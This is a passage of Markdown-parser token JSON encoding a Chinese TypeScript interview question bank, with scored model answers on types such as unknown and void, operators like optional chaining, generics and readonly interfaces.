类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","escaped":false}]}]},{"type":"list_item","raw":"- **1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型\\n","task":false,"loose":false,"text":"**1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","tokens":[{"type":"text","raw":"**1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","text":"**1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","text":" unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","escaped":false}]}]},{"type":"list_item","raw":"- **1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自\\n","task":false,"loose":false,"text":"**1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","tokens":[{"type":"text","raw":"**1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","text":"**1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","text":" null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","escaped":false}]}]},{"type":"list_item","raw":"- **1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","task":false,"loose":false,"text":"**1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","tokens":[{"type":"text","raw":"**1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","text":"**1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","text":" void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## ?.、??、!、!.、_、** 等符号的含义？\\n\\n","depth":2,"text":"?.、??、!、!.、_、** 等符号的含义？","tokens":[{"type":"text","raw":"?.、??、!、!.、_、** 等符号的含义？","text":"?.、??、!、!.、_、** 等符号的含义？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行\\n- **1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数\\n- **1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined\\n- **1：** !. 在变量名后添加，可以断言排除undefined和null类型\\n- **1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324\\n- **1：** ** 求幂","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行\\n","task":false,"loose":false,"text":"**1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","tokens":[{"type":"text","raw":"**1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","text":"**1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","text":" ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","escaped":false}]}]},{"type":"list_item","raw":"- **1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数\\n","task":false,"loose":false,"text":"**1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","tokens":[{"type":"text","raw":"**1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","text":"**1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","text":" ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","escaped":false}]}]},{"type":"list_item","raw":"- **1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined\\n","task":false,"loose":false,"text":"**1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","tokens":[{"type":"text","raw":"**1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","text":"**1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","text":" ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","escaped":false}]}]},{"type":"list_item","raw":"- **1：** !. 在变量名后添加，可以断言排除undefined和null类型\\n","task":false,"loose":false,"text":"**1：** !. 在变量名后添加，可以断言排除undefined和null类型","tokens":[{"type":"text","raw":"**1：** !. 在变量名后添加，可以断言排除undefined和null类型","text":"**1：** !. 在变量名后添加，可以断言排除undefined和null类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" !. 在变量名后添加，可以断言排除undefined和null类型","text":" !. 在变量名后添加，可以断言排除undefined和null类型","escaped":false}]}]},{"type":"list_item","raw":"- **1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324\\n","task":false,"loose":false,"text":"**1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","tokens":[{"type":"text","raw":"**1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","text":"**1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","text":" _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","escaped":false}]}]},{"type":"list_item","raw":"- **1：** ** 求幂","task":false,"loose":false,"text":"**1：** ** 求幂","tokens":[{"type":"text","raw":"**1：** ** 求幂","text":"**1：** ** 求幂","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ** 求幂","text":" ** 求幂","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 请解释一下 TypeScript 中的基本数据类型有哪些？\\n\\n","depth":2,"text":"请解释一下 TypeScript 中的基本数据类型有哪些？","tokens":[{"type":"text","raw":"请解释一下 TypeScript 中的基本数据类型有哪些？","text":"请解释一下 TypeScript 中的基本数据类型有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  TypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  TypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","task":false,"loose":false,"text":"**1：**\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","tokens":[{"type":"text","raw":"**1：**\\n\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","text":"**1：**\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","text":"\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是泛型,有什么作用？\\n\\n","depth":2,"text":"什么是泛型,有什么作用？","tokens":[{"type":"text","raw":"什么是泛型,有什么作用？","text":"什么是泛型,有什么作用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","task":false,"loose":false,"text":"**1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","tokens":[{"type":"text","raw":"**1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","text":"**1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","text":" 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"code","raw":"```typescript\\n\\ninterface IResponseData<T>{\\n    code: number;\\n    message?: string;\\n    data: T;\\n}\\n\\n\\ninterface User {\\n  id: number;\\n  name: string;\\n  email: string;\\n}\\n\\n// 使用时传入User类型\\nconst response: IResponseData<User> = {\\n  code: 200,\\n  message: \\"Success\\",\\n  data: {\\n    id: 1,\\n    name: \\"xiaoming\\",\\n    email: \\"xxx@qq.com\\"\\n  }\\n};\\n\\n```","lang":"typescript","text":"\\ninterface IResponseData<T>{\\n    code: number;\\n    message?: string;\\n    data: T;\\n}\\n\\n\\ninterface User {\\n  id: number;\\n  name: string;\\n  email: string;\\n}\\n\\n// 使用时传入User类型\\nconst response: IResponseData<User> = {\\n  code: 200,\\n  message: \\"Success\\",\\n  data: {\\n    id: 1,\\n    name: \\"xiaoming\\",\\n    email: \\"xxx@qq.com\\"\\n  }\\n};\\n"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 8、如何在 TypeScript 中定义一个只读属性的接口？\\n\\n","depth":2,"text":"8、如何在 TypeScript 中定义一个只读属性的接口？","tokens":[{"type":"text","raw":"8、如何在 TypeScript 中定义一个只读属性的接口？","text":"8、如何在 TypeScript 中定义一个只读属性的接口？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用 readonly 关键字。例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用 readonly 关键字。例如：","task":false,"loose":false,"text":"**1：** 使用 readonly 关键字。例如：","tokens":[{"type":"text","raw":"**1：** 使用 readonly 关键字。例如：","text":"**1：** 使用 readonly 关键字。例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 readonly 关键字。例如：","text":" 使用 readonly 关键字。例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\ninterface Person {\\n  readonly name: string;\\n}\\nlet p: Person = { name: \\"John\\" };\\n// p.name = \\"Doe\\";  // 错误，不能修改只读属性\\n```","lang":"ts","text":"interface Person {\\n  readonly name: string;\\n}\\nlet p: Person = { name: \\"John\\" };\\n// p.name = \\"Doe\\";  // 错误，不能修改只读属性"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. 什么是TypeScript？\\n\\n","depth":2,"text":"9. 什么是TypeScript？","tokens":[{"type":"text","raw":"9. 什么是TypeScript？","text":"9. 什么是TypeScript？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","task":false,"loose":false,"text":"**1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","tokens":[{"type":"text","raw":"**1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","text":"**1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","text":" Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？\\n\\n","depth":2,"text":"9. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？","tokens":[{"type":"text","raw":"9. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？","text":"9. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。\\n\\n- 杜绝手误导致的变量名写错;\\n\\n- 类型检查，提前发现潜在问题;\\n\\n- 类型推断，减少代码量，提高开发效率;\\n\\n- 支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;\\n\\n- 支持面向对象编程，比如类、接口、继承、泛型等;\\n\\n- 支持模块化开发，使得代码更加模块化、可维护、可复用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。\\n\\n","task":false,"loose":true,"text":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。\\n","tokens":[{"type":"text","raw":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。\\n","text":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。","tokens":[{"type":"text","raw":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。","text":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。","escaped":false}]}]},{"type":"list_item","raw":"- 杜绝手误导致的变量名写错;\\n\\n","task":false,"loose":true,"text":"杜绝手误导致的变量名写错;\\n","tokens":[{"type":"text","raw":"杜绝手误导致的变量名写错;\\n","text":"杜绝手误导致的变量名写错;","tokens":[{"type":"text","raw":"杜绝手误导致的变量名写错;","text":"杜绝手误导致的变量名写错;","escaped":false}]}]},{"type":"list_item","raw":"- 类型检查，提前发现潜在问题;\\n\\n","task":false,"loose":true,"text":"类型检查，提前发现潜在问题;\\n","tokens":[{"type":"text","raw":"类型检查，提前发现潜在问题;\\n","text":"类型检查，提前发现潜在问题;","tokens":[{"type":"text","raw":"类型检查，提前发现潜在问题;","text":"类型检查，提前发现潜在问题;","escaped":false}]}]},{"type":"list_item","raw":"- 类型推断，减少代码量，提高开发效率;\\n\\n","task":false,"loose":true,"text":"类型推断，减少代码量，提高开发效率;\\n","tokens":[{"type":"text","raw":"类型推断，减少代码量，提高开发效率;\\n","text":"类型推断，减少代码量，提高开发效率;","tokens":[{"type":"text","raw":"类型推断，减少代码量，提高开发效率;","text":"类型推断，减少代码量，提高开发效率;","escaped":false}]}]},{"type":"list_item","raw":"- 支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;\\n\\n","task":false,"loose":true,"text":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;\\n","tokens":[{"type":"text","raw":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;\\n","text":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;","tokens":[{"type":"text","raw":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;","text":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;","escaped":false}]}]},{"type":"list_item","raw":"- 支持面向对象编程，比如类、接口、继承、泛型等;\\n\\n","task":false,"loose":true,"text":"支持面向对象编程，比如类、接口、继承、泛型等;\\n","tokens":[{"type":"text","raw":"支持面向对象编程，比如类、接口、继承、泛型等;\\n","text":"支持面向对象编程，比如类、接口、继承、泛型等;","tokens":[{"type":"text","raw":"支持面向对象编程，比如类、接口、继承、泛型等;","text":"支持面向对象编程，比如类、接口、继承、泛型等;","escaped":false}]}]},{"type":"list_item","raw":"- 支持模块化开发，使得代码更加模块化、可维护、可复用。","task":false,"loose":true,"text":"支持模块化开发，使得代码更加模块化、可维护、可复用。","tokens":[{"type":"text","raw":"支持模块化开发，使得代码更加模块化、可维护、可复用。","text":"支持模块化开发，使得代码更加模块化、可维护、可复用。","tokens":[{"type":"text","raw":"支持模块化开发，使得代码更加模块化、可维护、可复用。","text":"支持模块化开发，使得代码更加模块化、可维护、可复用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## `type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }` 请问A和B的关系是什么？\\n\\n","depth":2,"text":"`type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }` 请问A和B的关系是什么？","tokens":[{"type":"codespan","raw":"`type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }`","text":"type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }"},{"type":"text","raw":" 请问A和B的关系是什么？","text":" 请问A和B的关系是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 